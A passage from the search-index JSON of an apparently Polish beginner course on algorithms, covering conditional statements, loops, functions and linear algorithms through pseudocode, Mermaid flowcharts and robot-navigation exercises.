ulicy.</p> <p>Kluczowe jest tutaj s\u0142owo: je\u017celi. W zale\u017cno\u015bci od tego, czy samochody jad\u0105, czy te\u017c nie, b\u0119dziemy wykonywa\u0107 r\u00f3\u017cne akcje. Je\u017celi samochody jad\u0105, to b\u0119dziemy czeka\u0107. A jak nic nie b\u0119dzie jecha\u0142o, to mo\u017cemy przej\u015b\u0107. Tak\u0105 konstrukcj\u0119 nazwiemy instrukcj\u0105 warunkow\u0105.</p> <p>Zastosowanie instrukcji warunkowej sprawia, \u017ce wykonanie naszego programu mo\u017ce mie\u0107 r\u00f3\u017cne przebiegi, tzn. r\u00f3\u017cne instrukcje mog\u0105 zosta\u0107 wykonane w zale\u017cno\u015bci od okre\u015blonych warunk\u00f3w.</p>"},{"location":"algorithms/introduction/conditionals/#prosta-instrukcja-warunkowa","title":"Prosta instrukcja warunkowa","text":"<p>Zacznijmy od prostego przyk\u0142adu. Ponownie wyobra\u017amy sobie przej\u015bcie dla pieszych, ale tym razem s\u0105 na nim \u015bwiat\u0142a drogowe. Jak przechodzi\u0107 przez przej\u015bcie na \u015bwiat\u0142ach ka\u017cdy powinien wiedzie\u0107. Spr\u00f3bujmy skonstruowa\u0107 algorytm dla tej operacji.</p>"},{"location":"algorithms/introduction/conditionals/#przykad-1","title":"Przyk\u0142ad 1","text":"<p>Zastan\u00f3wmy si\u0119 najpierw nad tym, jak wygl\u0105da przechodzenie przez przej\u015bcie na \u015bwiat\u0142ach. Najpierw patrzymy na \u015bwiat\u0142a i, w zale\u017cno\u015bci od ich koloru, przechodzimy przez ulic\u0119 albo czekamy. W takim razie nasza decyzja, czy te\u017c operacja, jak\u0105 wykonujemy, zale\u017cna jest od koloru \u015bwiate\u0142. Kolory te mog\u0105 by\u0107 dwa: zielony lub czerwony. Zastosujemy wi\u0119c dwie instrukcje warunkowe.</p>"},{"location":"algorithms/introduction/conditionals/#lista-krokow","title":"Lista krok\u00f3w","text":"<pre><code>1. Je\u015bli \u015bwiat\u0142o zielone to:\n    2. Id\u017a\n\n3. Je\u015bli \u015bwiat\u0142o czerwone to:\n    4. St\u00f3j\n</code></pre> <p>Zwr\u00f3\u0107 uwag\u0119 na wci\u0119cia w powy\u017cszym zapisie. Zazwyczaj, aby zasygnalizowa\u0107, \u017ce instrukcja znajduje si\u0119 wewn\u0105trz instrukcji warunkowej, u\u017cywamy wci\u0119cia.</p>"},{"location":"algorithms/introduction/conditionals/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([START]) --&gt; K1{\u015bwiat\u0142o zielone}\n    K1 -- PRAWDA --&gt; K2[Id\u017a]\n    K1 -- FA\u0141SZ --&gt; K3{\u015bwiat\u0142o czerwone}\n    K2 --&gt; K3\n    K3 -- PRAWDA --&gt; K4[St\u00f3j]\n    K3 -- FA\u0141SZ --&gt; STOP([STOP])\n    K4 --&gt; STOP</code></pre>"},{"location":"algorithms/introduction/conditionals/#przykad-2","title":"Przyk\u0142ad 2","text":"<p>Ten sam algorytm mo\u017cemy tak\u017ce skonstruowa\u0107 w nieco odmienny spos\u00f3b. Zauwa\u017cmy, \u017ce rozwa\u017camy tylko dwa mo\u017cliwe kolory \u015bwiate\u0142. Mogliby\u015bmy wi\u0119c tak\u017ce powiedzie\u0107, \u017ce je\u017celi \u015bwiat\u0142o jest zielone, to przechodzimy przez ulic\u0119, a w ka\u017cdym innym przypadku stoimy i czekamy. Spr\u00f3bujmy to zapisa\u0107 w formie algorytmu.</p>"},{"location":"algorithms/introduction/conditionals/#lista-krokow_1","title":"Lista krok\u00f3w","text":"<pre><code>1. Je\u015bli \u015bwiat\u0142o zielone to:\n    2. Id\u017a\n3. W przeciwnym przypadku:\n    4. St\u00f3j\n</code></pre>"},{"location":"algorithms/introduction/conditionals/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([START]) --&gt; K1{\u015bwiat\u0142o zielone}\n    K1 -- PRAWDA --&gt; K2[Id\u017a]\n    K1 -- FA\u0141SZ --&gt; K3[St\u00f3j]\n    K2 --&gt; STOP([STOP])\n    K3 --&gt; STOP</code></pre>"},{"location":"algorithms/introduction/conditionals/#zozona-instrukcja-warunkowa","title":"Z\u0142o\u017cona instrukcja warunkowa","text":"<p>Rozwa\u017cmy teraz kolejny przyk\u0142ad: \u015bwiat\u0142a drogowe dla kierowc\u00f3w. W przeciwie\u0144stwie do \u015bwiate\u0142 dla pieszych mamy tutaj trzy r\u00f3\u017cne kolory: zielony, \u017c\u00f3\u0142ty i czerwony. Spr\u00f3bujmy wi\u0119c skonstruowa\u0107 odpowiedni algorytm.</p>"},{"location":"algorithms/introduction/conditionals/#przykad-1_1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithms/introduction/conditionals/#lista-krokow_2","title":"Lista krok\u00f3w","text":"<pre><code>1. Je\u015bli \u015bwiat\u0142o zielone to:\n    2. Jed\u017a\n3. W przeciwnym przypadku, je\u015bli \u015bwiat\u0142o \u017c\u00f3\u0142te to:\n    4. Czekaj\n5. W przeciwnym przypadku, je\u015bli \u015bwiat\u0142o czerwone to:\n    6. St\u00f3j\n</code></pre>"},{"location":"algorithms/introduction/conditionals/#schemat-blokowy_2","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([START]) --&gt; K1{\u015bwiat\u0142o zielone}\n    K1 -- PRAWDA --&gt; K2[Jed\u017a]\n    K1 -- FA\u0141SZ --&gt; K3{\u015bwiat\u0142o \u017c\u00f3\u0142te}\n    K3 -- PRAWDA --&gt; K4[Czekaj]\n    K3 -- FA\u0141SZ --&gt; K5{\u015bwiat\u0142o czerwone}\n    K5 -- PRAWDA --&gt; K6[St\u00f3j]\n    K6 --&gt; STOP([STOP])\n    K2 --&gt; STOP\n    K4 --&gt; STOP</code></pre>"},{"location":"algorithms/introduction/conditionals/#przykad-2_1","title":"Przyk\u0142ad 2","text":"<p>Podobnie jak poprzednio, nie musimy dok\u0142adnie okre\u015bla\u0107 wszystkich przypadk\u00f3w. Tym razem wystarczy okre\u015bli\u0107 pierwsze dwa, poniewa\u017c wiemy, \u017ce je\u017celi \u015bwiat\u0142o nie jest zielone ani \u017c\u00f3\u0142te, to musimy sta\u0107 i czeka\u0107.</p>"},{"location":"algorithms/introduction/conditionals/#lista-krokow_3","title":"Lista krok\u00f3w","text":"<pre><code>1. Je\u015bli \u015bwiat\u0142o zielone to: \n    2. Jed\u017a\n3. W przeciwnym przypadku, je\u015bli \u015bwiat\u0142o \u017c\u00f3\u0142te to: \n    4. Czekaj\n5. W przeciwnym przypadku: \n    6. St\u00f3j\n</code></pre>"},{"location":"algorithms/introduction/conditionals/#schemat-blokowy_3","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([START]) --&gt; K1{\u015bwiat\u0142o zielone}\n    K1 -- PRAWDA --&gt; K2[Jed\u017a]\n    K1 -- FA\u0141SZ --&gt; K3{\u015bwiat\u0142o \u017c\u00f3\u0142te}\n    K3 -- PRAWDA --&gt; K4[Czekaj]\n    K3 -- FA\u0141SZ --&gt; K6[St\u00f3j]\n    K6 --&gt; STOP([STOP])\n    K2 --&gt; STOP\n    K4 --&gt; STOP</code></pre>"},{"location":"algorithms/introduction/conditionals/#konstrukcja-warunkow-musi-byc-przemyslana","title":"Konstrukcja warunk\u00f3w musi by\u0107 przemy\u015blana","text":"<p>W poprzednich przyk\u0142adach nie mia\u0142o znaczenia, w jakiej kolejno\u015bci rozwa\u017camy kolejne warunki. Mogliby\u015bmy zamieni\u0107 kolejno\u015b\u0107 instrukcji warunkowych (oczywi\u015bcie wraz z operacjami) i wci\u0105\u017c mieliby\u015bmy poprawnie dzia\u0142aj\u0105cy algorytm. Nie zawsze jednak \u017cycie jest takie proste...</p>"},{"location":"algorithms/introduction/conditionals/#przykad-1_2","title":"Przyk\u0142ad 1","text":""},{"location":"algorithms/introduction/conditionals/#lista-krokow_4","title":"Lista krok\u00f3w","text":"<pre><code>1. Je\u015bli cena &gt; 100 to:\n    2. Wypisz \"Drogie\"\n3. W przeciwnym przypadku, je\u015bli cena &gt; 200 to:\n    4. Wypisz \"Bardzo drogie\"\n5. W przeciwnym przypadku:\n    6. Wypisz \"Tanie\"\n</code></pre>"},{"location":"algorithms/introduction/conditionals/#schemat-blokowy_4","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([START]) --&gt; K1{cena &gt; 100}\n    K1 -- PRAWDA --&gt; K2[/Wypisz 'Drogie'/]\n    K1 -- FA\u0141SZ --&gt; K3{cena &gt; 200}\n    K3 -- PRAWDA --&gt; K4[/Wypisz 'Bardzo drogie'/]\n    K3 -- FA\u0141SZ --&gt; K6[/Wypisz 'Tanie'/]\n    K2 --&gt; STOP([STOP])\n    K4 --&gt; STOP\n    K6 --&gt; STOP</code></pre> <p>Czy potrafisz stwierdzi\u0107, co jest nie tak z powy\u017csz\u0105 instrukcj\u0105 warunkow\u0105? Sama jej konstrukcja jest poprawna, ale nie do ko\u0144ca przemy\u015blana i mo\u017ce wprowadza\u0107 czytelnika w b\u0142\u0105d. Spr\u00f3buj zasymulowa\u0107 dzia\u0142anie algorytmu dla r\u00f3\u017cnych warto\u015bci ceny. Zastan\u00f3w si\u0119, jaka musi by\u0107 cena, \u017ceby ka\u017cdy z komunikat\u00f3w zosta\u0142 wypisany, tzn. dla jakich warto\u015bci zostanie wypisany komunikat \"drogie\", dla jakich \"bardzo drogie\", a dla jakich komunikat \"tanie\". Po\u015bwi\u0119\u0107 chwil\u0119 na samodzielne wykonanie tego \u0107wiczenia, zanim przejdziesz dalej.</p> <p>Zauwa\u017c, \u017ce komunikat \"bardzo drogie\" nie zostanie nigdy wypisany. Dlaczego tak si\u0119 dzieje? Wystarczy przyjrze\u0107 si\u0119 dok\u0142adnie konstrukcji warunk\u00f3w. Pierwszy warunek okre\u015bla, co ma si\u0119 wydarzy\u0107 dla cen wi\u0119kszych od 100. Drugi natomiast okre\u015bla, co ma si\u0119 wydarzy\u0107 dla cen wi\u0119kszych od 200. Wydawa\u0142oby si\u0119 zatem, \u017ce np. dla warto\u015bci 300 zostanie spe\u0142niony drugi warunek i wypisany komunikat \"bardzo drogie\". Tak si\u0119 jednak nie stanie. Dlaczego?</p> <p>Dzieje si\u0119 tak, poniewa\u017c dla takiej ceny pierwszy warunek jest ju\u017c spe\u0142niony. A skoro pierwszy warunek jest ju\u017c spe\u0142niony, to kolejne nie b\u0119d\u0105 ju\u017c sprawdzane i wykonywane.</p> <p>Oczywi\u015bcie powy\u017cszy algorytm mo\u017cna \u0142atwo poprawi\u0107 zamieniaj\u0105c kolejno\u015b\u0107 warunk\u00f3w, tak jak pokazuje poni\u017cszy przyk\u0142ad.</p>"},{"location":"algorithms/introduction/conditionals/#przykad-2_2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithms/introduction/conditionals/#lista-krokow_5","title":"Lista krok\u00f3w","text":"<pre><code>1. Je\u015bli cena &gt; 200 to:\n    2. Wypisz \"Bardzo drogie\"\n3. W przeciwnym przypadku, je\u015bli cena &gt; 100 to: \n    4. Wypisz \"Drogie\"\n5. W przeciwnym przypadku:\n    6. Wypisz \"Tanie\"\n</code></pre>"},{"location":"algorithms/introduction/conditionals/#schemat-blokowy_5","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([START]) --&gt; K1{cena &gt; 200}\n    K1 -- PRAWDA --&gt; K2[/Wypisz 'Bardzo drogie'/]\n    K1 -- FA\u0141SZ --&gt; K3{cena &gt; 100}\n    K3 -- PRAWDA --&gt; K4[/Wypisz 'Drogie'/]\n    K3 -- FA\u0141SZ --&gt; K6[/Wypisz 'Tanie'/]\n    K2 --&gt; STOP([STOP])\n    K4 --&gt; STOP\n    K6 --&gt; STOP</code></pre>"},{"location":"algorithms/introduction/exercises/","title":"\u0106wiczenia","text":"<p>Poznali\u015bmy podstawy algorytmiki i reprezentacji algorytm\u00f3w, to teraz przysz\u0142a pora na proste \u0107wiczenia. Naszym zadaniem b\u0119dzie poprowadzenie robota ze startu do mety. W tym celu stworzymy zestaw instrukcji dla robota: algorytm, kt\u00f3ry doprowadzi go do celu, czyli rozwi\u0105\u017ce zadany problem.</p>"},{"location":"algorithms/introduction/exercises/#podstawowe-zasady","title":"Podstawowe zasady","text":"<ul> <li>Pole startowe oznaczone jest na niebiesko.</li> <li>Meta oznaczona jest na zielono.</li> <li>Robot zaczyna na polu startowym. Jego celem jest dotarcie do mety.</li> <li>W ka\u017cdym kroku robot mo\u017ce przemie\u015bci\u0107 si\u0119 o jedno pole.</li> </ul> <p>Dost\u0119pne mamy nast\u0119puj\u0105ce instrukcje:</p> <ul> <li>Prawo.</li> <li>Lewo.</li> <li>G\u00f3ra.</li> <li>D\u00f3\u0142.</li> </ul> <p>Ka\u017cda z instrukcji sprawia, \u017ce robot przemieszcza si\u0119 o jedno pole we wskazanym kierunku.</p>"},{"location":"algorithms/introduction/exercises/#cwiczenie-1","title":"\u0106wiczenie 1","text":""},{"location":"algorithms/introduction/exercises/#przykadowe-rozwiazanie-algorytm-liniowy","title":"Przyk\u0142adowe rozwi\u0105zanie - algorytm liniowy","text":"<pre><code>1. Prawo.\n2. Prawo.\n3. Prawo.\n4. Prawo.\n</code></pre>"},{"location":"algorithms/introduction/exercises/#przykadowe-rozwiazanie-algorytm-z-petla","title":"Przyk\u0142adowe rozwi\u0105zanie - algorytm z p\u0119tl\u0105","text":"<pre><code>1. Powt\u00f3rz 4 razy:\n    2. Prawo.\n</code></pre>"},{"location":"algorithms/introduction/exercises/#cwiczenie-2","title":"\u0106wiczenie 2","text":""},{"location":"algorithms/introduction/exercises/#cwiczenie-3","title":"\u0106wiczenie 3","text":"<p>Nowa zasada: szare bloki oznaczaj\u0105 \u015bciany. Przez \u015bciany nie mo\u017cna przechodzi\u0107, ani te\u017c stawa\u0107 na nich, trzeba wi\u0119c je omija\u0107.</p> <p></p>"},{"location":"algorithms/introduction/exercises/#cwiczenie-4","title":"\u0106wiczenie 4","text":""},{"location":"algorithms/introduction/exercises/#cwiczenie-5","title":"\u0106wiczenie 5","text":""},{"location":"algorithms/introduction/exercises/#cwiczenie-6","title":"\u0106wiczenie 6","text":"<p>Nowa zasada: \u017c\u00f3\u0142te pola oznaczaj\u0105 skarb. Przed dotarciem na met\u0119 nale\u017cy zebra\u0107 wszystkie skarby, tzn. odwiedzi\u0107 ka\u017cde \u017c\u00f3\u0142te pole.</p> <p></p>"},{"location":"algorithms/introduction/exercises/#cwiczenie-7","title":"\u0106wiczenie 7","text":"<p>Nowe zasady:</p> <ul> <li>Poruszamy si\u0119 z perspektywy robota.</li> <li>Korzystamy z nowego zestawu instrukcji.</li> <li>Robot pocz\u0105tkowo skierowany jest w d\u00f3\u0142 (na po\u0142udnie).</li> </ul> <p>Nowy zestaw instrukcji:</p> <ul> <li>Id\u017a do przodu.</li> <li>Obr\u00f3\u0107 si\u0119 w lewo.</li> <li>Obr\u00f3\u0107 si\u0119 w prawo.</li> </ul> <p></p>"},{"location":"algorithms/introduction/functions/","title":"Funkcje","text":"<p>Wyobra\u017amy sobie czarne magiczne pude\u0142ko. Takie pude\u0142ko, do kt\u00f3rego co\u015b wrzucamy i co\u015b innego z niego wypada. Wk\u0142adamy do niego wej\u015bcie, a wychodzi wyj\u015bcie:</p> <p></p> <p>Inaczej m\u00f3wi\u0105c, wk\u0142adamy do pude\u0142ka pewne dane, a wyci\u0105gamy z niego wynik:</p> <p></p> <p>Takie pude\u0142ko reprezentuje nam w\u0142a\u015bnie funkcj\u0119.</p>"},{"location":"algorithms/introduction/functions/#czym-jest-funkcja","title":"Czym jest funkcja?","text":"<p>W programowaniu poj\u0119cie funkcji mo\u017cemy rozumie\u0107 wielorako. Naj\u0142atwiej my\u015ble\u0107 o tym jak o pewnym fragmencie programu, kt\u00f3ry ma konkretne zadanie i swoj\u0105 w\u0142asn\u0105 nazw\u0119. Do funkcji przekazujemy dane w postaci parametr\u00f3w, a w odpowiedzi dostajemy wynik zgodny ze specyfikacj\u0105 funkcji.</p> <p>Danger</p> <p>Nie nale\u017cy myli\u0107 funkcji w programowaniu i funkcji w matematyce, to dwa zupe\u0142nie r\u00f3\u017cne twory!</p> <p>Schematyczny zapis funkcji przedstawia si\u0119 nast\u0119puj\u0105co:</p> <pre><code>funkcja NazwaFunkcji(parametr1, parametr2, ...):\n    Operacja1\n    Operacja2\n    ...\n    Zwr\u00f3\u0107 wynik\n</code></pre>"},{"location":"algorithms/introduction/functions/#przykad-automat-do-kawy","title":"Przyk\u0142ad - automat do kawy","text":"<p>Wyobra\u017amy sobie automat do kawy, taki jaki stoi na korytarzach wielu biur, szk\u00f3\u0142 i dworc\u00f3w kolejowych. Mo\u017cemy powiedzie\u0107, \u017ce reprezentuje ona pewn\u0105 funkcj\u0119, zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105:</p>"},{"location":"algorithms/introduction/functions/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/introduction/functions/#dane","title":"Dane","text":"<ul> <li>wyb\u00f3r - wybrany nap\u00f3j</li> <li>pieni\u0105dze - nale\u017cna kwota</li> </ul>"},{"location":"algorithms/introduction/functions/#wynik","title":"Wynik","text":"<ul> <li>Wybrany nap\u00f3j.</li> </ul> <p>Info</p> <p>Oczywi\u015bcie jest to bardzo uproszczona specyfikacja. W rzeczywisto\u015bci taki automat nie wyda nam napoju, je\u015bli nie ui\u015bcimy odpowiedniej op\u0142aty. Czasem opr\u00f3cz napoju dostaniemy te\u017c reszt\u0119. Taka specyfikacja wystarczy nam jednak do przyk\u0142adu.</p> <p>Spr\u00f3bujmy zapisa\u0107 fragment funkcji realizowanej przez taki automat w postaci pseudokodu:</p> <pre><code>funkcja AutomatDoKawy(wyb\u00f3r, pieni\u0105dze):\n    1. Je\u017celi wyb\u00f3r = \"latte\" i pieni\u0105dze = 3.0, to:\n        2. Zwr\u00f3\u0107 Latte i zako\u0144cz   \n</code></pre>"},{"location":"algorithms/introduction/functions/#procedura","title":"Procedura","text":"<p>W przeciwie\u0144stwie do funkcji procedura nie zwraca konkretnego wyniku. Jaki wi\u0119c mo\u017ce by\u0107 jej cel? Procedur\u0119 mo\u017cemy zastosowa\u0107, by np. zmieni\u0107 warto\u015bci zmiennych przekazanych jako parametry (je\u017celi je odpowiednio przeka\u017cemy), zmieni\u0107 warto\u015bci zmiennych globalnych, albo wypisa\u0107 komunikat na ekranie. Mo\u017cemy \u0142atwo wyobrazi\u0107 sobie procedur\u0119 powitanie, kt\u00f3ra przyjmuje imi\u0119 u\u017cytkownika i wy\u015bwietla na ekranie stosowny komunikat:</p> <pre><code>procedura Powitanie(imie):\n    1. Wypisz \"Witaj \"\n    2. Wypisz imie\n    3. Wypisz \"!\"\n    4. Wypisz znak nowej liniii\n    5. Zako\u0144cz\n</code></pre> <p>Warning</p> <p>Wsp\u00f3\u0142cze\u015bnie ju\u017c praktycznie nie rozr\u00f3\u017cniamy pomi\u0119dzy funkcj\u0105 a procedur\u0105. W wielu j\u0119zykach programowania wyst\u0119puj\u0105 tylko funkcje, w tym te\u017c takie, kt\u00f3re nie zwracaj\u0105 wyniku (albo kt\u00f3rych wynik ignorujemy).</p>"},{"location":"algorithms/introduction/functions/#prezentacja","title":"Prezentacja","text":"<p> Funkcje - wprowadzenie</p>"},{"location":"algorithms/introduction/iterative-loop/","title":"P\u0119tla iteracyjna","text":""},{"location":"algorithms/introduction/iterative-loop/#petla-prosta","title":"P\u0119tla prosta","text":"<p>Czasem chcemy co\u015b powt\u00f3rzy\u0107 kilka razy. Nie mamy \u017cadnego konkretnego warunku do spe\u0142nienia, po prostu musimy powt\u00f3rzy\u0107 pewn\u0105 operacj\u0119 wielokrotnie. Mogliby\u015bmy w\u00f3wczas dan\u0105 operacj\u0119 napisa\u0107 kilka razy, jedna pod drug\u0105, ale znacznie wygodniej jest u\u017cy\u0107 p\u0119tli.</p>"},{"location":"algorithms/introduction/iterative-loop/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/introduction/iterative-loop/#bez-petli","title":"Bez p\u0119tli","text":"<pre><code>1. Zg\u0142o\u015b si\u0119 na ochotnika do tablicy\n2. Zg\u0142o\u015b si\u0119 na ochotnika do tablicy\n3. Zg\u0142o\u015b si\u0119 na ochotnika do tablicy\n</code></pre>"},{"location":"algorithms/introduction/iterative-loop/#z-zastosowaniem-petli","title":"Z zastosowaniem p\u0119tli","text":"<pre><code>1. Powt\u00f3rz 3 razy poni\u017csze:\n    2. Zg\u0142o\u015b si\u0119 na ochotnika do tablicy\n</code></pre>"},{"location":"algorithms/introduction/iterative-loop/#zmienna-liczba-powtorzen","title":"Zmienna liczba powt\u00f3rze\u0144","text":"<p>Mo\u017ce tak\u017ce zdarzy\u0107 si\u0119 tak, \u017ce nie wiemy z g\u00f3ry ile razy b\u0119dziemy musieli powt\u00f3rzy\u0107 pewn\u0105 operacj\u0119. By\u0107 mo\u017ce jest to zale\u017cne od innych oblicze\u0144, a mo\u017ce od danych wej\u015bciowych. W\u00f3wczas nie mogliby\u015bmy napisa\u0107 kilku powt\u00f3rze\u0144 zadanej operacji jedna pod drug\u0105, bo nie wiemy, ile musia\u0142oby ich by\u0107! Mo\u017cemy to jednak zrealizowa\u0107 \u0142atwo za pomoc\u0105 p\u0119tli.</p>"},{"location":"algorithms/introduction/iterative-loop/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>1. Wczytaj n\n2. Powt\u00f3rz n-razy poni\u017csze:\n    3. Zg\u0142o\u015b si\u0119 na ochotnika do tablicy\n</code></pre>"},{"location":"algorithms/introduction/iterative-loop/#petla-z-licznikiem","title":"P\u0119tla z licznikiem","text":"<p>Czasem nie wystarczy nam powt\u00f3rzy\u0107 pewn\u0105 operacj\u0119 wielokrotnie. Czasem potrzebujemy jednocze\u015bnie co\u015b zlicza\u0107 np. powt\u00f3rzenia p\u0119tli w\u0142a\u015bnie. W\u00f3wczas przyda nam si\u0119 licznik p\u0119tli.</p> <p>U\u017cywaj\u0105c p\u0119tli z licznikiem powinni\u015bmy poda\u0107 zakres, z kt\u00f3rego licznik b\u0119dzie przyjmowa\u0142 kolejne warto\u015bci. To troch\u0119 tak, jakby\u015bmy sami co\u015b liczyli, np. od \\(1\\) do \\(5\\). Punktem startowym, czyli pocz\u0105tkow\u0105 warto\u015bci\u0105 licznika b\u0119dzie \\(1\\), a ostatni\u0105 warto\u015bci\u0105, jak\u0105 osi\u0105gnie licznik, b\u0119dzie \\(5\\). W kolejnych przebiegach (powt\u00f3rzeniach) p\u0119tli licznik b\u0119dzie przyjmowa\u0142 kolejne warto\u015bci z zadanego zakresu, czyli dla przyk\u0142adu b\u0119d\u0105 to warto\u015bci: \\(1,2,3,4,5\\).</p>"},{"location":"algorithms/introduction/iterative-loop/#przykad_2","title":"Przyk\u0142ad","text":""},{"location":"algorithms/introduction/iterative-loop/#bez-petli_1","title":"Bez p\u0119tli","text":"<pre><code>1. Napisz na tablicy 1\n2. Napisz na tablicy 2\n3. Napisz na tablicy 3\n4. Napisz na tablicy 4\n5. Napisz na tablicy 5\n</code></pre>"},{"location":"algorithms/introduction/iterative-loop/#z-zastosowaniem-petli-z-licznikiem","title":"Z zastosowaniem p\u0119tli z licznikiem","text":"<pre><code>1. Od i := 1 do 5, wykonuj:\n    2. Napisz na tablicy i\n</code></pre>"},{"location":"algorithms/introduction/iterative-loop/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([START]) --&gt; K0[i := 1]\n    K0 --&gt; K1{i &lt;= 5}\n    K1 -- PRAWDA --&gt; K2[/Napisz na tablicy i/]\n    K2 --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ ---&gt; STOP([STOP])</code></pre> <p>Zwr\u00f3\u0107 uwag\u0119, \u017ce podobnie jak w przypadku p\u0119tli warunkowej, dla p\u0119tli iteracyjnej tak\u017ce nie mamy specjalnego bloku. Tak naprawd\u0119 w schemacie blokowym p\u0119tl\u0119 iteracyjn\u0105 realizujemy jako p\u0119tl\u0119 warunkow\u0105, poniewa\u017c ka\u017cd\u0105 p\u0119tl\u0119 iteracyjn\u0105 mo\u017cna zrealizowa\u0107 za pomoc\u0105 p\u0119tli warunkowej.</p>"},{"location":"algorithms/introduction/iterative-loop/#krok-petli","title":"Krok p\u0119tli","text":"<p>Krok p\u0119tli okre\u015bla, o ile zmienia si\u0119 warto\u015b\u0107 licznika p\u0119tli w ka\u017cdym jej przebiegu. Domy\u015blnym krokiem p\u0119tli iteracyjnej jest \\(1\\). Je\u017celi korzystamy z warto\u015bci domy\u015blnej, to zazwyczaj nie piszemy kroku p\u0119tli. Mo\u017cemy go jednak z \u0142atwo\u015bci\u0105 zmodyfikowa\u0107, jak pokazuj\u0105 poni\u017csze przyk\u0142ady.</p>"},{"location":"algorithms/introduction/iterative-loop/#przykad-liczby-parzyste","title":"Przyk\u0142ad - liczby parzyste","text":"<p>Powiedzmy, \u017ce naszym zadaniem jest wypisa\u0107 na tablicy kolejne liczby parzyste od \\(2\\) do \\(10\\) w\u0142\u0105cznie. Mogliby\u015bmy przechodzi\u0107 przez kolejne warto\u015bci z tego zakresu i, je\u017celi liczba jest parzysta, wypisa\u0107 j\u0105 na tablicy. Mo\u017cemy te\u017c zmodyfikowa\u0107 krok p\u0119tli tak, by przechodzi\u0107 tylko przez kolejne liczby parzyste.</p> <pre><code>1. Od i := 2 do 10, z krokiem 2, wykonuj:\n    2. Napisz na tablicy i\n</code></pre> <p>Bez p\u0119tli:</p> <pre><code>1. Napisz na tablicy 2\n2. Napisz na tablicy 4\n3. Napisz na tablicy 6\n4. Napisz na tablicy 8\n5. Napisz na tablicy 10\n</code></pre>"},{"location":"algorithms/introduction/iterative-loop/#przykad-odliczanie-w-do","title":"Przyk\u0142ad - odliczanie w d\u00f3\u0142","text":"<p>Co w przypadku, gdy chcemy policzy\u0107 od \\(5\\) do \\(1\\)? Tutaj tak\u017ce mo\u017cemy skorzysta\u0107 z p\u0119tli iteracyjnej z odpowiednim krokiem.</p> <pre><code>1. Od i := 5 do 1, z krokiem -1, wykonuj:\n    2. Napisz na tablicy i\n</code></pre> <p>Bez p\u0119tli:</p> <pre><code>1. Napisz na tablicy 5\n2. Napisz na tablicy 4\n3. Napisz na tablicy 3\n4. Napisz na tablicy 2\n5. Napisz na tablicy 1\n</code></pre>"},{"location":"algorithms/introduction/linear-algorithms/","title":"Algorytmy liniowe","text":"<p>Czym jest algorytm? Instrukcja, przepis, schemat post\u0119powania... Algorytm opisuje rozwi\u0105zanie pewnego problemu. Istnieje wiele rodzaj\u00f3w algorytm\u00f3w, a my zaczniemy od najprostszego z nich - algorytm\u00f3w liniowych.</p>"},{"location":"algorithms/introduction/linear-algorithms/#algorytm-liniowy","title":"Algorytm liniowy","text":"<p>Algorytm liniowy to sekwencyjna instrukcja, kt\u00f3rej kroki wykonujemy jeden po drugim, linijka po linijce, operacja po operacji.</p> <p>W trakcie konstruowania algorytmu pojawia si\u0119 szereg pyta\u0144. Jak bardzo szczeg\u00f3\u0142owy powinien by\u0107 algorytm? Jakie operacje musimy w nim zawrze\u0107, a kt\u00f3re mo\u017cemy pomin\u0105\u0107? Jakie operacje s\u0105 dost\u0119pne? W jakiej formie powinni\u015bmy przedstawi\u0107 nasz algorytm? To tylko cz\u0119\u015b\u0107 z wa\u017cnych kwestii, kt\u00f3re nale\u017cy rozwa\u017cy\u0107.</p> <p>Rozwa\u017cmy poni\u017cszy przyk\u0142ad.</p>"},{"location":"algorithms/introduction/linear-algorithms/#przykad-1","title":"Przyk\u0142ad 1","text":"<p>Wyobra\u017amy sobie, \u017ce mamy przygotowa\u0107 kanapk\u0119 z d\u017cemem. To jest nasz problem. Dla tego problemu, zaproponujemy przyk\u0142adowe rozwi\u0105zanie w postaci algorytmu.</p> <pre><code>1. We\u017a kromk\u0119 chleba\n2. We\u017a mas\u0142o\n3. We\u017a d\u017cem\n4. We\u017a n\u00f3\u017c\n5. Posmaruj chleb mas\u0142em\n6. Posmaruj chleb d\u017cemem\n</code></pre> <p>Jak wida\u0107, powy\u017cszy przyk\u0142ad jest algorytmem przygotowania kanapki z d\u017cemem. Zastan\u00f3wmy si\u0119 jednak nad jego poprawno\u015bci\u0105 i dok\u0142adno\u015bci\u0105. Czy wszystkie niezb\u0119dne operacje zosta\u0142y uwzgl\u0119dnione? Czy mo\u017ce kt\u00f3re\u015b z nich mo\u017cna pomin\u0105\u0107? Czy powinni\u015bmy doda\u0107 instrukcj\u0119 odkr\u0119cenia s\u0142oika? A mo\u017ce otwarcie lod\u00f3wki, \u017ceby wyci\u0105gn\u0105\u0107 d\u017cem, a potem zamkni\u0119cie jej? Co je\u015bli nie ma d\u017cemu i trzeba i\u015b\u0107 do sklepu? A je\u015bli jest niedziela i sklepy s\u0105 zamkni\u0119te? A je\u015bli...</p> <p>Takie rozwa\u017cania mo\u017cemy kontynuowa\u0107 w niesko\u0144czono\u015b\u0107, ale musimy ustali\u0107 pewne 